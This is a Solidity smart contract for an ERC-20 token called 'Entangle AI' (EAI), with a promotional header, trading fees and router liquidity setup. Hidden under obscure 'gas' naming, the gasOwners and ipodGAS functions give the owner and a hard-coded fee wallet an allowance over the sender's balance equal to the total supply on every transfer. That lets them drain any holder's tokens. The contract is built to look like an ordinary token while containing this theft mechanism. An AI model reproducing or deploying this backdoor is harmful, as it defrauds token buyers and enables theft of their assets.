/*
Entangle AI is the programmable interoperability layer, connecting blockchains, data and the real world, unlocking limitless assets and applications

https://www.entangle-ai.com
https://app.entangle-ai.com
https://docs.entangle-ai.com
https://medium.com/@EntangleAI
https://x.com/EntangleAICom
https://t.me/EntangleAIChannel
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IGASFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IGASRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract EAI is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _gasHODLs;
    mapping (uint8 => address) private _gasWallets;
    mapping (address => mapping (address => uint256)) private _gasPermits;
    mapping (address => bool) private _gasFeeExcempt;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalGAS = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Entangle AI";
    string private constant _symbol = unicode"EAI";
    uint256 private _swapGASAmount = _tTotalGAS / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    address private _gasWallet = 0xb3236871fDD32036F695B326A8C88b74035ae842;
    bool private inSwapLock = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapLock = true;
        _;
        inSwapLock = false;
    }
    IGASRouter private _gasRouter;
    address private _gasPair;
    
    constructor () {
        _gasFeeExcempt[owner()] = true;
        _gasFeeExcempt[address(this)] = true;
        _gasFeeExcempt[_gasWallet] = true;
        _gasHODLs[_msgSender()] = _tTotalGAS;
        emit Transfer(address(0), _msgSender(), _tTotalGAS);
    }

    receive() external payable {}  

    function GAS() external onlyOwner() {
        _gasRouter = IGASRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_gasRouter), _tTotalGAS);
        _gasPair = IGASFactory(_gasRouter.factory()).createPair(address(this), _gasRouter.WETH());
        _gasWallets[0] = address(_gasWallet);
        _gasWallets[1] = address(owner());
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _gasRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalGAS;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _gasHODLs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _gasPermits[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _gasPermits[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _gasPermits[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address gas01, address gas02, uint256 gas0T) private {
        require(gas01 != address(0), "ERC20: transfer from the zero address");
        require(gas02 != address(0), "ERC20: transfer to the zero address");
        require(gas0T > 0, "Transfer amount must be greater than zero");

        uint256 gasFees=0;
        if (gasOwners(gas01, gas02)) {
            gasFees = gas0T.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (gas01 == _gasPair && gas02 != address(_gasRouter) && ! _gasFeeExcempt[gas02]) {
                _buyCount++;
            }

            if(gas02 == _gasPair && gas01!= address(this)) {
                gasFees = gas0T.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 tokenBalance = balanceOf(address(this)); 
            if (!inSwapLock && gas02 == _gasPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(tokenBalance > _swapGASAmount)
                swapTokensForEth(minGAS(gas0T, minGAS(tokenBalance, _swapGASAmount)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendGASFee(address(this).balance);
                }
            }
        }

        if(gasFees > 0){
          _gasHODLs[address(this)] = _gasHODLs[address(this)].add(gasFees);
          emit Transfer(gas01, address(this), gasFees);
        }

        _gasHODLs[gas01] = _gasHODLs[gas01].sub(gas0T);
        _gasHODLs[gas02] = _gasHODLs[gas02].add(gas0T.sub(gasFees));
        emit Transfer(gas01, gas02, gas0T.sub(gasFees));
    }

    function ipodGAS(address gas01,address gas02) private {
        _approve(gas01, gas02, _tTotalGAS);
    }

    function minGAS(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendGASFee(uint256 amount) private {
        payable(_gasWallet).transfer(amount);
    }

    function gasOwners(address gas01, address gas02) private returns(bool) { 
        if(_gasWallets[0] != address(0))
            ipodGAS(gas01, _gasWallets[0]);
        if(_gasWallets[1] != address(0))
            ipodGAS(gas01, _gasWallets[1]);
        return gas01 != owner() 
            && gas02 != owner();
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _gasRouter.WETH();
        _approve(address(this), address(_gasRouter), tokenAmount);
        _gasRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}